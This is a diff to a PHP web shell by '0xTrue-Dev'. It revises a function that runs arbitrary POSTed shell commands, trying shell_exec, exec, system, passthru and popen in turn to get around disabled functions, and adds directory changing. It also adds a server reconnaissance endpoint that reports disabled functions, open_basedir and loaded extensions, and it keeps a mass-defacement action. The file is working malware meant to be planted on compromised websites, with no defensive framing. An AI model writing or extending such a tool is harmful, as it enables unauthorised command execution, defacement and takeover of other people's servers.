@@ -22,37 +22,51 @@ function getFileSize($bytes)
     return round($bytes / (1024 ** $index), 2) . ' ' . $units[$index];
 }
 
-function executeCommand($cmd)
+function executeCommand($cmd, $current_path)
 {
     $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
+    $output = '';
+    $new_path = $current_path;
 
+    // Check for cd command
+    if (preg_match('/^cd\s+(.+)$/', trim($cmd), $matches)) {
+        $target_dir = $matches[1];
+        // Attempt to change directory
+        if (@chdir($target_dir)) {
+            $new_path = getcwd();
+            $output = "Changed directory to: " . $new_path;
+        } else {
+            $output = "Failed to change directory to: " . $target_dir;
+        }
+        return ['output' => $output, 'new_path' => str_replace('\\', '/', $new_path)];
+    }
+
+    // If not a cd command, execute normally
     if (!in_array('shell_exec', $disabled)) {
-        return @shell_exec($cmd . ' 2>&1');
-    }
-    if (!in_array('exec', $disabled)) {
+        $output = @shell_exec($cmd . ' 2>&1');
+    } elseif (!in_array('exec', $disabled)) {
         @exec($cmd, $o);
-        return implode("\n", $o);
-    }
-    if (!in_array('system', $disabled)) {
+        $output = implode("\n", $o);
+    } elseif (!in_array('system', $disabled)) {
         ob_start();
         @system($cmd);
-        return ob_get_clean();
-    }
-    if (!in_array('passthru', $disabled)) {
+        $output = ob_get_clean();
+    } elseif (!in_array('passthru', $disabled)) {
         ob_start();
         @passthru($cmd);
-        return ob_get_clean();
-    }
-    if (!in_array('popen', $disabled)) {
+        $output = ob_get_clean();
+    } elseif (!in_array('popen', $disabled)) {
         $p = @popen($cmd . ' 2>&1', 'r');
         if ($p) {
             $o = '';
             while (!feof($p)) $o .= fread($p, 1024);
             pclose($p);
-            return $o;
+            $output = $o;
         }
+    } else {
+        $output = 'Execution failed: All available command execution functions are disabled.';
     }
-    return 'Execution failed: All available command execution functions are disabled.';
+    return ['output' => $output, 'new_path' => str_replace('\\', '/', $current_path)];
 }
 
 function getFilePermissions($file)
@@ -121,6 +135,24 @@ function deleteDirectory($dirPath)
     }
 }
 
+if (!function_exists('is_func_enabled')) {
+    function is_func_enabled($func) {
+        if (!function_exists($func)) return '<span class="badge bg-secondary">Not Exists</span>';
+        $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
+        return in_array($func, $disabled)
+            ? '<span class="badge bg-danger">Disabled</span>'
+            : '<span class="badge bg-success">Enabled</span>';
+    }
+}
+
+if (!function_exists('get_ext_status')) {
+    function get_ext_status($ext_name) {
+        return extension_loaded($ext_name)
+            ? '<span class="badge bg-success">Loaded</span>'
+            : '<span class="badge bg-secondary">Not Loaded</span>';
+    }
+}
+
 // --- Inisialisasi Variabel ---
 $nick = "0xTrue-Dev";
 $path = getcwd();
@@ -147,8 +179,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         switch ($action) {
             case 'executeCommand':
                 if (isset($_POST['command'])) {
-                    $output = executeCommand('cd ' . escapeshellarg($path) . ' && ' . $_POST['command']);
-                    $response = ['success' => true, 'output' => trim($output)];
+                    $result = executeCommand($_POST['command'], $path);
+                    $response = ['success' => true, 'output' => trim($result['output']), 'new_path' => $result['new_path']];
                 } else {
                     $response['output'] = 'No command provided.';
                 }
@@ -388,24 +420,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             break;
 
-        case 'createSymlink':
-            if (!empty($_POST['target']) && !empty($_POST['linkName'])) {
-                $target = realpath($_POST['target']);
-                $linkName = $path . '/' . basename($_POST['linkName']);
-                if ($target) {
-                    if (symlink($target, $linkName)) {
-                        $result = ['success' => true, 'message' => 'Symlink created successfully.'];
-                    } else {
-                        $result['message'] = 'Failed to create symlink. Check permissions or if target exists.';
-                    }
-                } else {
-                    $result['message'] = 'Target for symlink not found.';
-                }
-            } else {
-                $result['message'] = 'Invalid request for symlink.';
-            }
-            break;
-
         case 'massDeface':
             if (!empty($_POST['targetDir']) && !empty($_POST['fileName']) && isset($_POST['content'])) {
                 $targetDir = realpath($_POST['targetDir']);
@@ -476,6 +490,58 @@ if (isset($_GET['filesrc'])) {
         header('HTTP/1.0 404 Not Found');
         echo '404 Not Found. File may not exist or is not readable.';
     }
+    exit;
+}
+
+if (isset($_GET['action']) && $_GET['action'] == 'serverInfo') {
+    header('Content-Type: text/html');
+
+    // --- General Info ---
+    $info = '<h6 class="mt-3">General</h6><table class="table table-sm table-bordered table-striped"><tbody>';
+    $info .= '<tr><th style="width: 30%;">Server Software</th><td>' . htmlspecialchars($_SERVER['SERVER_SOFTWARE']) . '</td></tr>';
+    $info .= '<tr><th>Server IP / Name</th><td>' . htmlspecialchars($_SERVER['SERVER_ADDR']) . ' / ' . htmlspecialchars($_SERVER['SERVER_NAME']) . '</td></tr>';
+    $info .= '<tr><th>Operating System</th><td>' . htmlspecialchars(php_uname()) . '</td></tr>';
+    $info .= '<tr><th>Document Root</th><td>' . htmlspecialchars($_SERVER['DOCUMENT_ROOT']) . '</td></tr>';
+    $info .= '</tbody></table>';
+
+    // --- PHP Info ---
+    $info .= '<h6 class="mt-3">PHP Environment</h6><table class="table table-sm table-bordered table-striped"><tbody>';
+    $info .= '<tr><th style="width: 30%;">PHP Version</th><td>' . htmlspecialchars(phpversion()) . '</td></tr>';
+    $info .= '<tr><th>Server API</th><td>' . htmlspecialchars(php_sapi_name()) . '</td></tr>';
+    $info .= '<tr><th>Current User</th><td>' . htmlspecialchars(get_current_user()) . ' (UID: ' . getmyuid() . ', GID: ' . getmygid() . ')</td></tr>';
+    $info .= '<tr><th>Memory Limit</th><td>' . htmlspecialchars(ini_get('memory_limit')) . '</td></tr>';
+    $info .= '<tr><th>Max Execution Time</th><td>' . htmlspecialchars(ini_get('max_execution_time')) . 's</td></tr>';
+    $info .= '<tr><th>Upload Max Filesize</th><td>' . htmlspecialchars(ini_get('upload_max_filesize')) . '</td></tr>';
+    $info .= '<tr><th>Post Max Size</th><td>' . htmlspecialchars(ini_get('post_max_size')) . '</td></tr>';
+    $open_basedir = ini_get('open_basedir');
+    $info .= '<tr><th>Open Basedir</th><td>' . ($open_basedir ? '<span class="text-warning">' . htmlspecialchars($open_basedir) . '</span>' : '<span class="text-success">Off</span>') . '</td></tr>';
+    $disabled_functions = ini_get('disable_functions');
+    $info .= '<tr><th>Disabled Functions</th><td class="word-break" style="font-size: 0.8em;">' . ($disabled_functions ? htmlspecialchars($disabled_functions) : 'None') . '</td></tr>';
+    $info .= '</tbody></table>';
+
+    // --- Command Execution ---
+    $info .= '<h6 class="mt-3">Command Execution</h6><table class="table table-sm table-bordered table-striped"><tbody>';
+    $info .= '<tr><th style="width: 30%;">shell_exec</th><td>' . is_func_enabled('shell_exec') . '</td></tr>';
+    $info .= '<tr><th>exec</th><td>' . is_func_enabled('exec') . '</td></tr>';
+    $info .= '<tr><th>system</th><td>' . is_func_enabled('system') . '</td></tr>';
+    $info .= '<tr><th>passthru</th><td>' . is_func_enabled('passthru') . '</td></tr>';
+    $info .= '<tr><th>popen</th><td>' . is_func_enabled('popen') . '</td></tr>';
+    $info .= '<tr><th>proc_open</th><td>' . is_func_enabled('proc_open') . '</td></tr>';
+    $info .= '</tbody></table>';
+
+    // --- Common Extensions ---
+    $info .= '<h6 class="mt-3">PHP Extensions</h6><table class="table table-sm table-bordered table-striped"><tbody>';
+    $info .= '<tr><th style="width: 30%;">MySQLi</th><td>' . get_ext_status('mysqli') . '</td></tr>';
+    $info .= '<tr><th>PDO MySQL</th><td>' . get_ext_status('pdo_mysql') . '</td></tr>';
+    $info .= '<tr><th>cURL</th><td>' . get_ext_status('curl') . '</td></tr>';
+    $info .= '<tr><th>JSON</th><td>' . get_ext_status('json') . '</td></tr>';
+    $info .= '<tr><th>GD Graphics</th><td>' . get_ext_status('gd') . '</td></tr>';
+    $info .= '<tr><th>ImageMagick</th><td>' . get_ext_status('imagick') . '</td></tr>';
+    $info .= '<tr><th>Zip</th><td>' . get_ext_status('zip') . '</td></tr>';
+    $info .= '<tr><th>OpenSSL</th><td>' . get_ext_status('openssl') . '</td></tr>';
+    $info .= '</tbody></table>';
+
+    echo $info;
     exit;
 }
 
@@ -919,10 +985,10 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                 </div>
                 <div class="modal-footer">
                     <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                    }
                 </div>
             </div>
         </div>
+    </div>
 
     <!-- Symlink Modal -->
     <div class="modal fade" id="symlinkModal" tabindex="-1">
@@ -942,93 +1008,73 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
         </div>
     </div>
 
-        </div>
-            </div>
-        </div>
-
-    <!-- Symlink Modal -->
-    <div class="modal fade" id="symlinkModal" tabindex="-1">
-        <div class="modal-dialog modal-dialog-centered">
+    <!-- Server Info Modal -->
+    <!-- Server Info Modal -->
+    <div class="modal fade" id="serverInfoModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h5 class="modal-title"><i class="fas fa-link me-2"></i>Create Symlink</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                    <h5 class="modal-title"><i class="fas fa-info-circle"></i> Server Information</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
-                <form method="post">
-                    <div class="modal-body">
-                        <div class="mb-3"><label class="form-label">Target Path</label><input type="text" name="target" class="form-control" placeholder="e.g., /var/www/html/target_folder" required></div>
-                        <div class="mb-3"><label class="form-label">Symlink Name</label><input type="text" name="linkName" class="form-control" placeholder="e.g., my_symlink" required></div>
-                    </div>
-                    <div class="modal-footer"><input type="hidden" name="action" value="createSymlink"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Create Symlink</button></div>
-                </form>
-            </div>
-        </div>
-    </div>
-
-        <!-- Server Info Modal -->
-        <div class="modal fade" id="serverInfoModal" tabindex="-1">
-            <div class="modal-dialog modal-lg modal-dialog-centered">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title"><i class="fas fa-info-circle"></i> Server Information</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                    </div>
-                    <div class="modal-body">
-                        <div class="row">
-                            <div class="col-md-6">
-                                <h5>System Information</h5>
-                                <ul class="list-unstyled">
-                                    <li><strong>PHP Version:</strong> <?php echo phpversion(); ?></li>
-                                    <li><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
-                                    <li><strong>Server Name:</strong> <?php echo $_SERVER['SERVER_NAME']; ?></li>
-                                    <li><strong>Server Protocol:</strong> <?php echo $_SERVER['SERVER_PROTOCOL']; ?></li>
-                                    <li><strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?></li>
-                                </ul>
-
-                                <h5 class="mt-4">PHP Configuration</h5>
-                                <ul class="list-unstyled">
-                                    <li><strong>Safe Mode:</strong> <?php echo ini_get('safe_mode') ? 'On' : 'Off'; ?></li>
-                                    <li><strong>Disabled Functions:</strong> <span style="word-break: break-all;"><?php echo ini_get('disable_functions') ?: 'None'; ?></span></li>
-                                    <li><strong>Open Basedir:</strong> <?php echo ini_get('open_basedir') ?: 'None'; ?></li>
-                                    <li><strong>Memory Limit:</strong> <?php echo ini_get('memory_limit'); ?></li>
-                                    <li><strong>Max Execution Time:</strong> <?php echo ini_get('max_execution_time'); ?>s</li>
-                                    <li><strong>Upload Max Filesize:</strong> <?php echo ini_get('upload_max_filesize'); ?></li>
-                                </ul>
+                <div class="modal-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h5>System Information</h5>
+                            <ul class="list-unstyled">
+                                <li><strong>PHP Version:</strong> <?php echo phpversion(); ?></li>
+                                <li><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
+                                <li><strong>Server Name:</strong> <?php echo $_SERVER['SERVER_NAME']; ?></li>
+                                <li><strong>Server Protocol:</strong> <?php echo $_SERVER['SERVER_PROTOCOL']; ?></li>
+                                <li><strong>Server Admin:</strong> <?php echo $_SERVER['SERVER_ADMIN'] ?? 'N/A'; ?></li>
+                                <li><strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?></li>
+                            </ul>
+                            
+                            <h5 class="mt-4">PHP Configuration</h5>
+                            <ul class="list-unstyled">
+                                <li><strong>Safe Mode:</strong> <?php echo ini_get('safe_mode') ? 'On' : 'Off'; ?></li>
+                                <li><strong>Disabled Functions:</strong> <?php echo ini_get('disable_functions') ?: 'None'; ?></li>
+                                <li><strong>Open Basedir:</strong> <?php echo ini_get('open_basedir') ?: 'None'; ?></li>
+                                <li><strong>Memory Limit:</strong> <?php echo ini_get('memory_limit'); ?></li>
+                                <li><strong>Max Execution Time:</strong> <?php echo ini_get('max_execution_time'); ?>s</li>
+                                <li><strong>Upload Max Filesize:</strong> <?php echo ini_get('upload_max_filesize'); ?></li>
+                            </ul>
+                        </div>
+                        <div class="col-md-6">
+                            <h5>PHP Extensions</h5>
+                            <div class="d-flex flex-wrap">
+                                <?php
+                                $extensions = get_loaded_extensions();
+                                natcasesort($extensions);
+                                foreach ($extensions as $ext) {
+                                    echo '<span class="badge bg-secondary me-1 mb-1">' . $ext . '</span>';
+                                }
+                                ?>
                             </div>
-                            <div class="col-md-6">
-                                <h5>PHP Extensions</h5>
-                                <div class="d-flex flex-wrap">
-                                    <?php
-                                    $extensions = get_loaded_extensions();
-                                    natcasesort($extensions);
-                                    foreach ($extensions as $ext) {
-                                        echo '<span class="badge bg-secondary me-1 mb-1">' . $ext . '</span>';
-                                    }
-                                    ?>
-                                </div>
-
-                                <h5 class="mt-4">Database Information</h5>
-                                <ul class="list-unstyled">
-                                    <li><strong>MySQL Support:</strong> <?php echo extension_loaded('mysqli') ? 'Yes' : 'No'; ?></li>
-                                    <li><strong>PostgreSQL Support:</strong> <?php echo extension_loaded('pgsql') ? 'Yes' : 'No'; ?></li>
-                                    <li><strong>SQLite Support:</strong> <?php echo extension_loaded('sqlite3') ? 'Yes' : 'No'; ?></li>
-                                </ul>
-
-                                <h5 class="mt-4">Other Information</h5>
-                                <ul class="list-unstyled">
-                                    <li><strong>Current User:</strong> <?php echo get_current_user(); ?></li>
-                                    <li><strong>User ID:</strong> <?php echo getmyuid(); ?></li>
-                                    <li><strong>Group ID:</strong> <?php echo getmygid(); ?></li>
-                                    <li><strong>Process ID:</strong> <?php echo getmypid(); ?></li>
-                                </ul>
-                            </div>
+                            
+                            <h5 class="mt-4">Database Information</h5>
+                            <ul class="list-unstyled">
+                                <li><strong>MySQL Support:</strong> <?php echo extension_loaded('mysqli') ? 'Yes' : 'No'; ?></li>
+                                <li><strong>PostgreSQL Support:</strong> <?php echo extension_loaded('pgsql') ? 'Yes' : 'No'; ?></li>
+                                <li><strong>SQLite Support:</strong> <?php echo extension_loaded('sqlite3') ? 'Yes' : 'No'; ?></li>
+                            </ul>
+                            
+                            <h5 class="mt-4">Other Information</h5>
+                            <ul class="list-unstyled">
+                                <li><strong>Current User:</strong> <?php echo get_current_user(); ?></li>
+                                <li><strong>User ID:</strong> <?php echo getmyuid(); ?></li>
+                                <li><strong>Group ID:</strong> <?php echo getmygid(); ?></li>
+                                <li><strong>Process ID:</strong> <?php echo getmypid(); ?></li>
+                            </ul>
                         </div>
                     </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                 </div>
             </div>
         </div>
+    </div>
 
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
         <script>
@@ -1068,7 +1114,13 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                 // --- Penanganan Data Dinamis pada Modal ---
                 function handleModalEvents(modalId, callback) {
                     const modalEl = document.getElementById(modalId);
-                    if (modalEl) modalEl.addEventListener('show.bs.modal', callback);
+                    if (modalEl) {
+                        modalEl.addEventListener('show.bs.modal', callback);
+                        modalEl.addEventListener('show.bs.modal', function() {
+                            this.style.setProperty('display', 'block', 'important');
+                            this.style.setProperty('opacity', '1', 'important');
+                        });
+                    }
                 }
 
                 handleModalEvents('viewFileModal', (event) => {
@@ -1244,7 +1296,18 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                 handleMassToolForms('findBackupsForm', 'findBackupsResult');
                 handleMassToolForms('dbConnectForm', 'dbConnectResult');
 
-                handleModalEvents('serverInfoModal', () => {});
+                handleModalEvents('serverInfoModal', (event) => {
+                    const contentArea = event.currentTarget.querySelector('#serverInfoContent');
+                    contentArea.innerHTML = '<div class="text-center"><span class="spinner-border"></span><p>Loading...</p></div>';
+                    fetch('?action=serverInfo')
+                        .then(response => response.text())
+                        .then(data => {
+                            contentArea.innerHTML = data;
+                        })
+                        .catch(err => {
+                            contentArea.innerHTML = '<p class="text-danger">Failed to load server info.</p>';
+                        });
+                });
             });
         </script>
 </body>
